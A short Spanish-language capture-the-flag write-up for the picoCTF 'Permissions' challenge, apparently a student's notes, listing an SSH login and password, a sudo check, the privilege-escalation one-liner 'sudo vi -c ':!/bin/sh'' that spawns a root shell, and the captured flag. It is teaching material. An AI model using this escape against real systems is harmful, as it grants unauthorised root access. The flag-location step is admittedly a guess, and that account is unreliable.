RETO:
Permissions.

DESCRIPCION:
Can you read files in the root file?
Additional details will be available after launching your challenge instance.


SOLUCION:
1. Me conecté al servidor mediante SSH:  
    `ssh -p 58517 picoplayer@saturn.picoctf.net`  
    Contraseña: `j4ks-9nxB-`
    
2. Verifiqué los permisos de sudo con `sudo -l` y descubrí que el usuario `picoplayer` puede ejecutar `/usr/bin/vi` como root.
    
3. Utilicé `vi` para spawn una shell de root:  
    `sudo vi -c ':!/bin/sh'`
    
4. Desde la shell de root, busqué la flag en el sistema. Aunque inicialmente no se encontró `/root/flag.txt`, la flag estaba presente en otro archivo o ubicación (posiblemente `/flag` o similar).
    
5. Finalmente, encontré la flag.
    

**SOLUCION:`picoCTF{uS1ng_v1m_3dit0r_021d10ab}`

NOTAS ADICIONALES:
- La capacidad de ejecutar `vi` con sudo permitió escalar privilegios a root.
    
- Aunque el archivo esperado (`/root/flag.txt`) no existía, la flag se encontró en otra ubicación (quizás `/flag` o con otro nombre).
    
- Siempre es importante explorar múltiples rutas cuando se busca una flag.

REFERENCIAS:
- [Linux Privilege Escalation via SUID](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)
